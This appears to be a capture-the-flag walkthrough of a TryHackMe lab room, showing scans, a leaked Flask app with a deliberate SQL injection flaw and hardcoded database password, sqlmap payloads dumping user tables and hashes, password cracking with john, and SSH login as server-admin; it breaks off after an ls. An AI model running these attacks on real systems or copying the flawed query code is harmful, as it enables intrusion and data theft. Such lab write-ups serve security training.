----
You've been hired by Billy Joel to get revenge on Ducky Inc...the company that fired him. Can you break into the server and complete your mission?
---

![123](https://tryhackme-images.s3.amazonaws.com/room-icons/46f132f9d913c89cbe4a3c749c420406.png)

### Message from Billy Joel

 Download Task Files

![123](https://image.freepik.com/free-vector/chat-bubble_53876-25540.jpg)

[Image from freepik.com](https://www.freepik.com/free-vector/chat-bubble_2900821.htm#page=1&query=message&position=30)  

Billy Joel has sent you a message regarding your mission.  Download it, read it and continue on.

Answer the questions below

Read through your mission and continue

Question Done

### Revenge!

 Start Machine

![123](https://image.freepik.com/free-photo/closeup-rubber-duck_53876-32073.jpg)  

[Image from freepik.com](https://www.freepik.com/free-photo/closeup-rubber-duck_3011778.htm#page=1&query=rubber%20ducky&position=15)  

This is revenge! You've been hired by Billy Joel to break into and deface the Rubber Ducky Inc. webpage. He was fired for probably good reasons but who cares, you're just here for the money. Can you fulfill your end of the bargain?  

There is a sister room to this one. If you have not completed [Blog](https://tryhackme.com/room/blog) yet, I recommend you do so. It's not required but may enhance the story for you.

All images on the webapp, including the navbar brand logo, 404 and 500 pages, and product images goes to [Varg](https://tryhackme.com/p/Varg). Thanks for helping me out with this one, bud.

Please hack responsibly. Do not attack a website or domain that you do not own the rights to. TryHackMe does not condone illegal hacking. This room is just for fun and to tell a story.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads]
└─$ cat qTyAhRp.txt 
To whom it may concern,

I know it was you who hacked my blog.  I was really impressed with your skills.  You were a little sloppy 
and left a bit of a footprint so I was able to track you down.  But, thank you for taking me up on my offer.  
I've done some initial enumeration of the site because I know *some* things about hacking but not enough.  
For that reason, I'll let you do your own enumeration and checking.

What I want you to do is simple.  Break into the server that's running the website and deface the front page.  
I don't care how you do it, just do it.  But remember...DO NOT BRING DOWN THE SITE!  We don't want to cause irreparable damage.

When you finish the job, you'll get the rest of your payment.  We agreed upon $5,000.  
Half up-front and half when you finish.

Good luck,

Billy


┌──(witty㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.124.107 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.124.107:22
Open 10.10.124.107:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-12 14:05 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:05
Completed Parallel DNS resolution of 1 host. at 14:05, 0.04s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 14:05
Scanning 10.10.124.107 [2 ports]
Discovered open port 22/tcp on 10.10.124.107
Discovered open port 80/tcp on 10.10.124.107
Completed Connect Scan at 14:05, 0.19s elapsed (2 total ports)
Initiating Service scan at 14:05
Scanning 2 services on 10.10.124.107
Completed Service scan at 14:05, 6.54s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.124.107.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 5.60s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.78s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Nmap scan report for 10.10.124.107
Host is up, received user-set (0.19s latency).
Scanned at 2023-03-12 14:05:46 EDT for 13s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7253b77aebab22701cf73c7ac776d989 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDBiHOfDlVoYCp0+/LM7BhujeUicHQ+HwAidwcp1yMZE3j6K/7RW3XsNSEyUR8RpVaXAHl7ThNfD2pmzGPBV9uOjNlgNuzhASOgQuz9G4hQyLh5u1Sv9QR8R9udClyRoqUwGBfdNKjqAK2Kw7OghAHXlwUxniYRLUeAD60oLjm4uIv+1QlA2t5/LL6utV2ePWOEHe8WehXPGrstJtJ8Jf/uM48s0jhLhMEewzSqR2w0LWAGDFzOdfnOvcyQtJ9FeswJRG7fWXXsOms0Fp4lhTL4fknL+PSdWEPagTjRfUIRxskkFsaxI//3EulETC+gSa+KilVRfiKAGTdrdz7RL5sl
|   256 437700fbda42025852127dcd4e524fc3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNNoSioP7IDDu4yIVfGnhLoMTyvBuzxILnRr7rKGX0YpNShJfHLjEQRIdUoYq+/7P0wBjLoXn9g7XpLLb7UMvm4=
|   256 2b57137cc84f1dc26867283f8e3930ab (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEpROzuQcffRwKXCOz+JQ5p7QKnAQVEDUwwUkkblavyh
80/tcp open  http    syn-ack nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: E859DC70A208F0F0242640410296E06A
| http-methods: 
|_  Supported Methods: HEAD GET OPTIONS
|_http-title: Home | Rubber Ducky Inc.
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 14:05
Completed NSE at 14:05, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.05 seconds

┌──(witty㉿kali)-[~/Downloads]
└─$ gobuster -t 64 dir -e -k -u http://10.10.124.107/ -w /usr/share/dirb/wordlists/common.txt         
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.107/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/12 14:09:19 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.124.107/admin                (Status: 200) [Size: 4983]
http://10.10.124.107/contact              (Status: 200) [Size: 6906]
http://10.10.124.107/index                (Status: 200) [Size: 8541]
http://10.10.124.107/login                (Status: 200) [Size: 4980]
http://10.10.124.107/products             (Status: 200) [Size: 7254]
http://10.10.124.107/static               (Status: 301) [Size: 194] [--> http://10.10.124.107/static/]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/12 14:10:16 Finished
===============================================================



┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://10.10.124.107/admin --forms --dump
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.7.2#stable}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:11:46 /2023-03-12/

[14:11:46] [INFO] testing connection to the target URL
[14:11:47] [INFO] searching for forms
[1/1] Form:
GET http://10.10.124.107/admin?action=
do you want to test this form? [Y/n/q] 
Y
Edit GET data [default: action=]: 
do you want to fill blank fields with random values? [Y/n] Y
[14:12:04] [INFO] using '/home/witty/.local/share/sqlmap/output/results-03122023_0212pm.csv' as the CSV results file in multiple targets mode
[14:12:04] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:12:05] [INFO] testing if the target URL content is stable
[14:12:05] [INFO] target URL content is stable
[14:12:05] [INFO] testing if GET parameter 'action' is dynamic
[14:12:06] [WARNING] GET parameter 'action' does not appear to be dynamic
[14:12:06] [WARNING] heuristic (basic) test shows that GET parameter 'action' might not be injectable
[14:12:06] [INFO] testing for SQL injection on GET parameter 'action'
[14:12:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:12:09] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[14:12:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:12:12] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[14:12:13] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[14:12:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[14:12:17] [INFO] testing 'Generic inline queries'
[14:12:18] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[14:12:19] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[14:12:20] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[14:12:22] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:12:24] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[14:12:26] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[14:12:27] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[14:13:10] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[14:13:14] [WARNING] GET parameter 'action' does not seem to be injectable
[14:13:14] [ERROR] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent', skipping to the next target
[14:13:14] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/witty/.local/share/sqlmap/output/results-03122023_0212pm.csv'

[*] ending @ 14:13:14 /2023-03-12/


──(witty㉿kali)-[~]
└─$ gobuster -t 64 dir -e -k -u http://10.10.124.107/ -w /usr/share/dirb/wordlists/common.txt -x php,py
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.124.107/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,py
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/03/12 14:33:46 Starting gobuster in directory enumeration mode
===============================================================
http://10.10.124.107/admin                (Status: 200) [Size: 4983]
http://10.10.124.107/app.py               (Status: 200) [Size: 2371]
Progress: 1974 / 13845 (14.26%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/12 14:34:23 Finished
===============================================================

┌──(witty㉿kali)-[/tmp]
└─$ wget http://10.10.124.107/app.py 
--2023-03-12 14:35:31--  http://10.10.124.107/app.py
Connecting to 10.10.124.107:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2371 (2.3K) [application/octet-stream]
Saving to: ‘app.py’

app.py               100%[====================>]   2.32K  --.-KB/s    in 0s      

2023-03-12 14:35:31 (45.3 MB/s) - ‘app.py’ saved [2371/2371]

                                                                                  
┌──(witty㉿kali)-[/tmp]
└─$ cat app.py            
from flask import Flask, render_template, request, flash
from flask_sqlalchemy import SQLAlchemy
from sqlalchemy import create_engine
from flask_bcrypt import Bcrypt

app = Flask(__name__)

app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)
bcrypt = Bcrypt(app)


app.secret_key = b'_5#y2L"F4Q8z\n\xec]/'
eng = create_engine('mysql+pymysql://root:PurpleElephants90!@localhost/duckyinc')


# Main Index Route
@app.route('/', methods=['GET'])
@app.route('/index', methods=['GET'])
def index():
    return render_template('index.html', title='Home')


# Contact Route
@app.route('/contact', methods=['GET', 'POST'])
def contact():
    if request.method == 'POST':
        flash('Thank you for reaching out.  Someone will be in touch shortly.')
        return render_template('contact.html', title='Contact')

    elif request.method == 'GET':
        return render_template('contact.html', title='Contact')


# Products Route
@app.route('/products', methods=['GET'])
def products():
    return render_template('products.html', title='Our Products')


# Product Route
# SQL Query performed here
@app.route('/products/<product_id>', methods=['GET'])
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)


# Login
@app.route('/login', methods=['GET'])
def login():
    if request.method == 'GET':
        return render_template('login.html', title='Customer Login')


# Admin login
@app.route('/admin', methods=['GET'])
def admin():
    if request.method == 'GET':
        return render_template('admin.html', title='Admin Login')


# Page Not found error handler
@app.errorhandler(404)
def page_not_found(e):
    return render_template('404.html', error=e), 404


@app.errorhandler(500)
def internal_server_error(e):
    return render_template('500.html', error=e), 500


if __name__ == "__main__":
    app.run('0.0.0.0')

The user input product_id is directly used in the sql query. So this query must be exploitable.

let's do it in products

http://10.10.124.107/products/3'

Don't worry. We have things under control (mostly).

┌──(witty㉿kali)-[~/Downloads]
└─$ sqlmap -u http://10.10.124.107/products/3 --dump
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.7.2#stable}
|_ -| . [,]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 14:20:28 /2023-03-12/

[14:20:29] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[14:20:33] [INFO] testing connection to the target URL
[14:20:34] [INFO] checking if the target is protected by some kind of WAF/IPS
[14:20:35] [INFO] testing if the target URL content is stable
[14:20:35] [INFO] target URL content is stable
[14:20:35] [INFO] testing if URI parameter '#1*' is dynamic
[14:20:36] [WARNING] URI parameter '#1*' does not appear to be dynamic
[14:20:36] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[14:20:37] [INFO] testing for SQL injection on URI parameter '#1*'
[14:20:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[14:20:39] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --code=200)
[14:20:47] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL' 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[14:20:59] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[14:21:00] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[14:21:00] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[14:21:01] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[14:21:01] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[14:21:01] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[14:21:02] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[14:21:02] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[14:21:02] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:21:03] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:21:03] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:21:03] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[14:21:04] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[14:21:04] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[14:21:05] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[14:21:05] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[14:21:05] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[14:21:06] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[14:21:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[14:21:07] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[14:21:08] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[14:21:08] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[14:21:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[14:21:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[14:21:10] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[14:21:10] [INFO] testing 'Generic inline queries'
[14:21:10] [INFO] testing 'MySQL inline queries'
[14:21:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[14:21:11] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[14:21:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[14:21:12] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[14:21:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[14:21:13] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[14:21:13] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[14:21:25] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[14:21:25] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[14:21:25] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[14:21:25] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[14:21:26] [INFO] target URL appears to have 8 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] N
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[14:21:56] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://10.10.124.107:80/products/3 AND 4331=4331

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://10.10.124.107:80/products/3 AND (SELECT 2390 FROM (SELECT(SLEEP(5)))VVyB)

    Type: UNION query
    Title: Generic UNION query (NULL) - 8 columns
    Payload: http://10.10.124.107:80/products/-1946 UNION ALL SELECT 62,CONCAT(0x716a767a71,0x5973754c534c48716e414741544b69716f6f7a484150425a4955584f757142544566436251575849,0x7162707871),62,62,62,62,62,62-- -
---
[14:22:01] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Nginx 1.14.0
back-end DBMS: MySQL >= 5.0.12
[14:22:03] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[14:22:03] [INFO] fetching current database
[14:22:04] [INFO] fetching tables for database: 'duckyinc'
[14:22:04] [INFO] fetching columns for table 'user' in database 'duckyinc'
[14:22:05] [INFO] fetching entries for table 'user' in database 'duckyinc'
Database: duckyinc
Table: user
[10 entries]
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| id | email                           | company          | username | _password                                                    | credit_card                |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+
| 1  | sales@fakeinc.org               | Fake Inc         | jhenry   | $2a$12$dAV7fq4KIUyUEOALi8P2dOuXRj5ptOoeRtYLHS85vd/SBDv.tYXOa | 4338736490565706           |
| 2  | accountspayable@ecorp.org       | Evil Corp        | smonroe  | $2a$12$6KhFSANS9cF6riOw5C66nerchvkU9AHLVk7I8fKmBkh6P/rPGmanm | 355219744086163            |
| 3  | accounts.payable@mcdoonalds.org | McDoonalds Inc   | dross    | $2a$12$9VmMpa8FufYHT1KNvjB1HuQm9LF8EX.KkDwh9VRDb5hMk3eXNRC4C | 349789518019219            |
| 4  | sales@ABC.com                   | ABC Corp         | ngross   | $2a$12$LMWOgC37PCtG7BrcbZpddOGquZPyrRBo5XjQUIVVAlIKFHMysV9EO | 4499108649937274           |
| 5  | sales@threebelow.com            | Three Below      | jlawlor  | $2a$12$hEg5iGFZSsec643AOjV5zellkzprMQxgdh1grCW3SMG9qV9CKzyRu | 4563593127115348           |
| 6  | ap@krasco.org                   | Krasco Org       | mandrews | $2a$12$reNFrUWe4taGXZNdHAhRme6UR2uX..t/XCR6UnzTK6sh1UhREd1rC | thm{br3ak1ng_4nd_3nt3r1ng} |
| 7  | payable@wallyworld.com          | Wally World Corp | dgorman  | $2a$12$8IlMgC9UoN0mUmdrS3b3KO0gLexfZ1WvA86San/YRODIbC8UGinNm | 4905698211632780           |
| 8  | payables@orlando.gov            | Orlando City     | mbutts   | $2a$12$dmdKBc/0yxD9h81ziGHW4e5cYhsAiU4nCADuN0tCE8PaEv51oHWbS | 4690248976187759           |
| 9  | sales@dollatwee.com             | Dolla Twee       | hmontana | $2a$12$q6Ba.wuGpch1SnZvEJ1JDethQaMwUyTHkR0pNtyTW6anur.3.0cem | 375019041714434            |
| 10 | sales@ofamdollar                | O!  Fam Dollar   | csmith   | $2a$12$gxC7HlIWxMKTLGexTq8cn.nNnUaYKUpI91QaqQ/E29vtwlwyvXe36 | 364774395134471            |
+----+---------------------------------+------------------+----------+--------------------------------------------------------------+----------------------------+

[14:22:05] [INFO] table 'duckyinc.`user`' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.124.107/dump/duckyinc/user.csv'
[14:22:05] [INFO] fetching columns for table 'system_user' in database 'duckyinc'
[14:22:06] [INFO] fetching entries for table 'system_user' in database 'duckyinc'
Database: duckyinc
Table: system_user
[3 entries]
+----+----------------------+--------------+--------------------------------------------------------------+
| id | email                | username     | _password                                                    |
+----+----------------------+--------------+--------------------------------------------------------------+
| 1  | sadmin@duckyinc.org  | server-admin | $2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a |
| 2  | kmotley@duckyinc.org | kmotley      | $2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa |
| 3  | dhughes@duckyinc.org | dhughes      | $2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK |
+----+----------------------+--------------+--------------------------------------------------------------+

[14:22:06] [INFO] table 'duckyinc.`system_user`' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.124.107/dump/duckyinc/system_user.csv'
[14:22:06] [INFO] fetching columns for table 'product' in database 'duckyinc'
[14:22:06] [INFO] fetching entries for table 'product' in database 'duckyinc'
Database: duckyinc
Table: product
[4 entries]
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| id | cost     | name                  | price    | details                                                                                                                                                                                                                                                                                                                 | in_stock | image_url                         | color_options             |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+
| 1  | 50.00    | Box of Duckies        | 35.00    | Individual boxes of duckies! Boxes are sold only in the yellow color. This item is eligible for FAST shipping from one of our local warehouses. If you order before 2 PM on any weekday, we can guarantee that your order will be shipped out the same day.                                                             | Y        | images/box-of-duckies.png         | yellow                    |
| 2  | 500.00   | Dozen of Duckies      | 600.00   | Do you love a dozen donuts? Then you'll love a dozen boxes of duckies! This item is not eligible for FAST shipping. However, orders of this product are typically shipped out next day, provided they are ordered prior to 2 PM on any weekday.                                                                         | N        | images/dozen-boxes-of-duckies.png | yellow, blue, green, red  |
| 3  | 800.00   | Pallet of Duckies     | 1000.00  | Got lots of shelves to fill? Customers that want their duckies? Look no further than the pallet of duckies! This baby comes with 20 boxes of duckies in the colors of your choosing. Boxes can only contain one color ducky but multiple colors can be selected when you call to order. Just let your salesperson know. | N        | images/pallet.png                 | yellow, blue, red, orange |
| 4  | 15000.00 | Truck Load of Duckies | 22000.00 | This is it! Our largest order of duckies! You mean business with this order. You must have a ducky emporium if you need this many duckies. Due to the logistics with this type of order, FAST shipping is not available.\r\n\r\nActual truck not pictured.                                                              | Y        | images/truckload.png              | yellow, blue              |
+----+----------+-----------------------+----------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+----------+-----------------------------------+---------------------------+

[14:22:07] [INFO] table 'duckyinc.product' dumped to CSV file '/home/witty/.local/share/sqlmap/output/10.10.124.107/dump/duckyinc/product.csv'
[14:22:07] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 81 times
[14:22:07] [INFO] fetched data logged to text files under '/home/witty/.local/share/sqlmap/output/10.10.124.107'

[*] ending @ 14:22:07 /2023-03-12/

┌──(witty㉿kali)-[/tmp]
└─$ echo '$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a' > hash
                                                                                                                                                                   
┌──(witty㉿kali)-[/tmp]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 256 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
inuyasha         (?)     
1g 0:00:00:01 DONE (2023-03-12 14:24) 0.6172g/s 155.5p/s 155.5c/s 155.5C/s hellokitty..edward
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

server-admin : inuyasha (ssh)

┌──(witty㉿kali)-[~/Downloads]
└─$ ssh server-admin@10.10.124.107 
The authenticity of host '10.10.124.107 (10.10.124.107)' can't be established.
ED25519 key fingerprint is SHA256:TQ86zGh+CjOLHbL41BszBXVekLEpibum8BrA6AYnqIA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.124.107' (ED25519) to the list of known hosts.
server-admin@10.10.124.107's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 1.0


8 packages can be updated.
0 updates are security updates.


################################################################################
#			 Ducky Inc. Web Server 00080012			       #
#	     This server is for authorized Ducky Inc. employees only	       #
#		   All actiions are being monitored and recorded	       #
#		     IP and MAC addresses have been logged		       #
################################################################################
Last login: Wed Aug 12 20:09:36 2020 from 192.168.86.65
server-admin@duckyinc:~$ whoami;pwd
server-admin
/home/server-admin

server-admin@duckyinc:~$ ls -lah
total 44K
drwxr-xr-x 5 server-admin server-admin 4.0K Aug 12  2020 .
drwxr-xr-x 3 root         root         4.0K Aug 10  2020 ..
